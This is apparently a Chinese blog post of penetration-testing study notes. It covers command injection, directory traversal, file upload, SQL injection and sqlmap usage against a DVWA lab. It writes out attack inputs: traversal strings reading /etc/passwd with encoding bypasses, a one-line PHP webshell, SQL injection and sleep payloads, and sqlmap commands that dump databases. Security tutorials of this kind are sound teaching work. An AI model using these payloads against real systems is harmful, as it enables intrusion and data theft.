        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a>手动漏洞挖掘</h2><blockquote><ul><li>漏洞挖掘原则<ul><li>所有变量</li><li>所有头<ul><li>Cookie中的变量</li></ul></li><li>逐个变量删除</li></ul></li><li>漏洞的本质<ul><li>数据与指令的混淆</li><li>对用户输入信息过滤不严判断失误，误将指令当数据</li></ul></li><li>命令执行<ul><li>应用程序开发者直接调用系统功能</li><li>;    &amp;&amp;      |      ||     &amp;</li><li>查看源码，过滤用户输入</li></ul></li></ul></blockquote><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>加入<code>;</code>或者其他字符进行命令执行</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131193746528.png" alt="image-20230131193746528"></p><ul><li>若直接输入<code>ls</code>等命令不会输出任何结果</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194023031.png" alt="image-20230131194023031"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194051857.png" alt="image-20230131194051857"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194306224.png" alt="image-20230131194306224"></p><blockquote><p>可以观察下面的ping命令，<code>ping</code>后面跟的是主机名，而直接输入<code>ls</code>等命令会被误认为是主机名，从而不执行任何操作；分析源码接收客户端输入的ip值赋值给target，先判断是否是windows系统，之后则执行ping + ‘target’，最终将cmd结果显示出来</p></blockquote><ul><li>high级别防护</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131200133049.png" alt="image-20230131200133049"></p><blockquote><p>target接收到客户端的ip后会进行使用<code>stripslashes()</code>函数删除由 <code>addslashes()</code> 函数添加的反斜杠，之后<code>explode()</code>函数将target以<code>.</code>分割为数组赋值给octet，之后判断octet每一个元素是否是数字，若是四个元素都是数字，则将其再以<code>.</code>拼接起来赋值给target，最后再提交给服务端执行cmd；这时候以上提到的<code>;</code>以及管道符都不能进行绕过，需要其他的方法进行绕过。</p></blockquote><h2 id="目录遍历-x2F-文件包含"><a href="#目录遍历-x2F-文件包含" class="headerlink" title="目录遍历&#x2F;文件包含"></a>目录遍历&#x2F;文件包含</h2><blockquote><ul><li>Directory traversal &#x2F; File include（有区别&#x2F;没区别）<ul><li>目录权限限制不严 &#x2F; 文件包含</li></ul></li><li>&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php&#x2F;ini<ul><li>allow_url_include &#x3D; on</li></ul></li><li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul><li>读、写文件、远程执行代码</li></ul></li><li>特征但不绝对<ul><li>?page&#x3D;a.php</li><li>?home&#x3D;b.html</li><li>?file&#x3D;content</li></ul></li><li>经典测试方法<ul><li>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</li><li>?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd    # 文件系统访问方法，类似URL</li><li>?home&#x3D;main.cgi </li><li>?page&#x3D;<a href="http://www.a.com/1.php">http://www.a.com/1.php</a></li><li><a href="http://1.1.1.1/dir/file.txt">http://1.1.1.1/../../../../dir/file.txt</a></li></ul></li><li>编码绕过字符过滤<ul><li><code>.</code> ，<code>%00</code>            # 绕过文件扩展名过滤<ul><li>?file&#x3D;a.doc%00.php      # 00截断原理</li></ul></li><li>使用多种编码尝试</li></ul></li><li>不同操作系统的路径特征字符<ul><li>类unix系统<ul><li>根目录：&#x2F;</li><li>目录层级分隔符：&#x2F;</li></ul></li><li>windows系统<ul><li>C:\</li><li>\ 或 &#x2F;</li></ul></li></ul></li><li>编码（既要能绕过服务器限制，也能够使服务器进行解码）<ul><li>url编码、双层url编码<ul><li>%2e%2e%2f          # 解码：..&#x2F;</li><li>%2e%2e%5c          # 解码：..\</li><li>%252e%252e%255c      # 解码：..\</li></ul></li><li>Unicode&#x2F;UTF-8 编码<ul><li>..%c0%af                         # 解码：..&#x2F;</li><li>..%u2216                     </li><li>..%c1%9c                        # 解码：..\</li></ul></li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131204620954.png" alt="image-20230131204620954"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131204926566.png" alt="image-20230131204926566"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131211209722.png" alt="image-20230131211209722"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote><ul><li>文件上传漏洞<ul><li><?php echo shell_exec($_GET['cmd']);?></li></ul></li><li>直接上传webshell</li><li>修改文件类型上传webshell<ul><li>Mimetype—文件头、扩展名</li></ul></li><li>修改扩展名上传webshell<ul><li>静态解析文件扩展名时可能无法执行</li></ul></li><li>文件头绕过过滤上传webshell</li><li>上传目录权限</li></ul></blockquote><p>实操参考文章：</p><p><a href="https://noobxw.github.io/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/">https://noobxw.github.io/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/</a></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote><ul><li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器</li><li>用户登录判断<ul><li>SELECT * FROM users WHERE user&#x3D;‘uname’ AND password&#x3D;‘pass‘</li><li>SELECT * FROM users WHERE user&#x3D;‘name’ AND password&#x3D;’’ OR ‘’&#x3D;’‘</li></ul></li><li>盲注<ul><li>不显示数据库内建的报错信息<ul><li>内建的报错信息帮助开发人员发现和修复问题</li><li>报错信息提供关于系统的大量有用信息</li></ul></li><li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果</li><li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul><li>1’ and 1&#x3D;1 –+</li><li>1’ and 1&#x3D;2 –+</li></ul></li></ul></li></ul></blockquote><p>手工注入：<br><a href="https://noobxw.github.io/categories/SQL%E6%B3%A8%E5%85%A5/">https://noobxw.github.io/categories/SQL%E6%B3%A8%E5%85%A5/</a></p><h3 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h3><blockquote><ul><li><p>开源sql注入漏洞检测、利用工具</p></li><li><p>检测动态页面中get&#x2F;post参数、cookie、http头</p></li><li><p>数据榨取</p></li><li><p>文件系统访问</p></li><li><p>操作系统命令执行</p></li><li><p>引擎强大、特性丰富</p></li><li><p>Xss漏洞检测</p></li><li><p>五种漏洞检测技术</p><ul><li>基于布尔的盲注检测</li><li>基于时间的盲注检测<ul><li>‘ and (select * from (select(sleep(20)))a)–+</li></ul></li><li>基于错误的检测</li><li>基于UNION联合查询的检测<ul><li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li></ul></li><li>基于堆叠查询的检测<ul><li>;堆叠多个查询语句</li><li>适用于非select的数据修改、删除的操作</li></ul></li></ul></li><li><p>支持的数据库管理系统DBMS</p><ul><li><p>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access, IBM DB2, SQLite, </p><p>Firebird, Sybase , SAP MaxDB</p></li></ul></li></ul></blockquote><h4 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h4><blockquote><p>-u：指定sql注入的URL，其中一定存在变量名称的，例如<code>?id=1</code></p><p>-d：直接连接后端数据库，不是通过web端程序代码漏洞去执行sql连接，而是另外打开一个连接去直接连数据库服务器的数据库服务的侦听端口（例如：3306），把自己作为数据库客户端程序来使用</p><p>-l：后面跟logfile，logfile可以来自Burp&#x2F;WebScarab这样的代理程序，可以将代理过的访问请求记录日志log文件作为源文件提交给sqlmap，sqlmap会在log文件中逐个URL检查，是否有注入点，是否可以利用</p><p>-m：多个需要扫描的url存入文件，进行批量扫描</p><p>-r：将http请求头信息以及body数据信息保存为文件统一提交给sqlmap，sqlmap利用其中的内容来进行自己的命令拼接再进行组合指令传输给服务器端</p><p>-g：google搜索及如果再使用正则表达式从中过滤想要检查的url，自动完成扫描</p><p>-c：可以将sqlmap执行的每一个命令保存为一个配置文件，自动扫描</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201201007230.png" alt="image-20230201201007230"></p><h5 id="Get方法"><a href="#Get方法" class="headerlink" title="Get方法"></a>Get方法</h5><ul><li>随便输入用户名密码之后可以观察url</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201203257812.png" alt="image-20230201203257812"></p><ul><li>将地址保存下来使用sqlmap检测</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201203617522.png" alt="image-20230201203617522"></p><blockquote><p>url地址使用<code>&quot;&quot;</code>引起来，sqlmap在判断那些是变量名称时会存在问题；</p><p>-p参数：指定变量进行检测是否存在sql注入漏洞，其他变量不检查</p><p>-f：检查数据库的指纹信息</p></blockquote><ul><li>检测结果</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204224313.png" alt="image-20230201204224313"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204821654.png" alt="image-20230201204821654"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204132814.png" alt="image-20230201204132814"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205251848.png" alt="image-20230201205251848"></p><blockquote><p>sqlmap不仅会检测sql注入漏洞，还会检测xss漏洞；使用的payload如上图；查询结果在<code>/root/.local/share/sqlmap/output/192.168.216.167</code>中</p></blockquote><ul><li>查询当前数据库账号</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205344090.png" alt="image-20230201205344090"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205410348.png" alt="image-20230201205410348"></p><ul><li>查询banner信息</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205508882.png" alt="image-20230201205508882"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205531287.png" alt="image-20230201205531287"></p><ul><li>查询目标数据库有哪些库</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205634638.png" alt="image-20230201205634638"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205619053.png" alt="image-20230201205619053"></p><ul><li>查询源数据库（可再加<code>-a</code>参数查询所有数据甚至进行密码破解）</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205728643.png" alt="image-20230201205728643"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205842330.png" alt="image-20230201205842330"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205852801.png" alt="image-20230201205852801"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201210139455.png" alt="image-20230201210139455"></p><h5 id="作为客户端直接连接数据库"><a href="#作为客户端直接连接数据库" class="headerlink" title="作为客户端直接连接数据库"></a>作为客户端直接连接数据库</h5><ul><li><p><code>sqlmap -d &quot;mysql://user:password@192.168.216.167:3306/dvwa&quot; -f --users</code> </p><p><code>--banner --dbs --schema -a</code></p><blockquote><p>这个命令需要知道该数据库的帐号密码以及数据库类型</p></blockquote></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201211622555.png" alt="image-20230201211622555"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201211633184.png" alt="image-20230201211633184"></p><ul><li><p>扫描URL列表文件</p><ul><li><code>sqlmap -m list.txt</code></li></ul></li><li><p>扫描google搜索结果</p><ul><li><p><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p><blockquote><p><code>\</code>作为转义符</p></blockquote></li></ul></li></ul><h5 id="Post方法"><a href="#Post方法" class="headerlink" title="Post方法"></a>Post方法</h5><ul><li>使用http请求文件（burpsuite）</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213020622.png" alt="image-20230201213020622"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213252969.png" alt="image-20230201213252969"></p><blockquote><p>将抓到的http请求信息复制到post.txt文本文件中</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201213540956.png" alt="image-20230201213540956"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215219439.png" alt="image-20230201215219439"></p><ul><li>使用burpsuite log文件</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215338405.png" alt="image-20230201215338405"></p><blockquote><p>选择代理请求并选择log.txt文件保存的位置；之后凡是通过代理访问的所有的http请求都会被log到log.txt文件中</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215705212.png" alt="image-20230201215705212"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215716573.png" alt="image-20230201215716573"></p><blockquote><p>通过代理在登录页面访问过的请求都被记录到了log.txt文件中，接着使用sqlmap使用日志文件检测</p></blockquote><ul><li>使用burpsuite log文件</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215922755.png" alt="image-20230201215922755"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201215935517.png" alt="image-20230201215935517"></p><blockquote><p>这就是post方法两种sqlmap注入方式</p></blockquote><ul><li><p>HTTPS</p><ul><li><code>sqlmap -u “https://1.1.1.1/a.php?id=1:8843” --force-ssl</code></li></ul></li><li><p>扫描配置文件</p><ul><li><code>sqlmap -c sqlmap.conf</code></li></ul><blockquote><p>sqlmap各种配置参数都可以被保存为sqlmap.conf文件，可以使用<code>-c</code>参数调用这个配置文件；其中有一个内置的默认sqlmap.conf文件</p></blockquote></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201220506462.png" alt="image-20230201220506462"></p><h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><blockquote><ul><li><p>–data    # 数据段</p><ul><li>get &#x2F; post 都适用</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php">http://1.1.1.1/a.php</a>“ –data&#x3D;”user&#x3D;1&amp;pass&#x3D;2” -f</li><li>将参数提交部分赋值给<code>data</code>参数</li></ul></li><li><p>–param-del      # 变量分隔符</p><ul><li><a href="http://1.1.1.1/a.php?q=foo;id=1">http://1.1.1.1/a.php?q=foo;id=1</a> &#x2F;&#x2F; ; &amp;</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php">http://1.1.1.1/a.php</a>“ –data&#x3D;”q&#x3D;foo;id&#x3D;1” –param-del&#x3D;”;” -f</li></ul></li><li><p>–cookie             # cookie头</p><ul><li>web应用需要基于cookie的身份认证</li><li>检查cookie中的注入点<strong>（level&gt;&#x3D;2）</strong></li><li>Set-Cookie &#x2F; –drop-set-cookie &#x2F; –cookie-del</li><li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1">http://1.1.1.1/a.php?id=1</a>“ –cookie&#x3D;”a&#x3D;1;b&#x3D;2” -f</li></ul></li><li><p>–user-agent   <strong>（level &gt;&#x3D; 3）</strong></p><ul><li>sqlmap&#x2F;1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>)</li></ul></li><li><p>–random-agent </p><ul><li>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;txt&#x2F;user-agents.txt</li></ul></li><li><p>–host    # Host头</p><ul><li><strong>level&#x3D;5</strong></li></ul></li><li><p>–referer</p><ul><li><strong>level&#x3D;3</strong></li></ul></li><li><p>–headers      # 额外的header</p><ul><li>每个头单独一行（名称区分大小写）</li></ul></li><li><p>–method&#x3D;GET&#x2F;POST</p></li><li><p>基于HTTP协议的身份认证</p><ul><li><p>Basic</p></li><li><p>Digest</p></li><li><p>NTLM</p></li><li><p><strong>sqlmap. -u “<a href="http://1.1.1.1/a.php?id=1">http://1.1.1.1/a.php?id=1</a>“ –auth-type Basic –auth-cred</strong> </p><p><strong>“user:pass“</strong>        # 命令使用方法</p></li></ul></li><li><p>–auth-cert &#x2F; –auth-file</p><ul><li>–auth-file&#x3D;”ca.PEM”</li><li>含有私钥的PEM格式证书文件</li><li>PEM格式的证书链文件</li></ul></li><li><p>http(s) 代理</p><ul><li>–proxy&#x3D;”<a href="http://127.0.0.1:8087/">http://127.0.0.1:8087</a>“</li><li>–proxy-cred&#x3D;”name:pass”</li><li>–ignore-proxy<ul><li>忽略系统级代理设置，通常用于扫描本地网络目标</li></ul></li><li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8087&quot; -f</code></li></ul></li><li><p>–scope</p><ul><li>过滤日志内容，通过正则表达式筛选扫描对象</li><li><code>sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)“</code> # 使用<code>\</code>进行转义</li><li><code>sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs</code></li><li>User-Agent中的注入点   # level&gt;&#x3D;3才会扫描UA头</li></ul></li><li><p>–safe-url &#x2F; –safe-freq</p><ul><li>检测和盲注截断产生大量失败请求，服务器端可能因此销毁session</li><li>每发送–safe-freq次注入请求后，发送一次正常请求</li><li>进行错误计数的绕过，连续多次的错误后发送正常请求</li></ul></li><li><p>–skip-urlencode</p><ul><li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li><li>直接添加命令行中，不会对Get请求中提交的数据进行URL编码，使用原始数据提交</li></ul></li><li><p>–evel</p><ul><li><p>每次请求前执行指定的python代码</p></li><li><p>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</p></li><li><p><code>sqlmap -u &quot;http://1.1.1.1/a.php?</code></p><p><code>id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import</code> </p><p><code>hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code> # hash值依赖于id值，其中hashlib.md5()函数将id值进行hash计算后再通过–eval参数赋值自动注入</p></li></ul></li><li><p>–delay</p><ul><li>每次http(s)请求之间延迟时间，浮点数，单位为秒，默认无延迟</li><li>防止入侵检测</li></ul></li><li><p>–timeout</p><ul><li>请求超时时间，浮点数，默认为30s</li></ul></li><li><p>–retries</p><ul><li>http(s)连接超时重试次数，默认3s</li></ul></li><li><p>–randomize</p><ul><li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li><li>sqlmap -u <a href="http://1.1.1.1/a.php?id=100">http://1.1.1.1/a.php?id=100</a> –randomize&#x3D;”id”   #  id每次随机取值</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202095933977.png" alt="image-20230202095933977"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202095953959.png" alt="image-20230202095953959"></p><h5 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h5><ul><li>Post<ul><li>抓包获取<code>url</code>以及数据段</li></ul></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202211925666.png" alt="image-20230202211925666"></p><ul><li>使用sqlmap注入</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212130229.png" alt="image-20230202212130229"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212212807.png" alt="image-20230202212212807"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212238431.png" alt="image-20230202212238431"></p><ul><li><p>Get</p><ul><li><p>获取url</p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202212555142.png" alt="image-20230202212555142"></p></li><li><p>注入</p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202213450294.png" alt="image-20230202213450294"></p><p><img 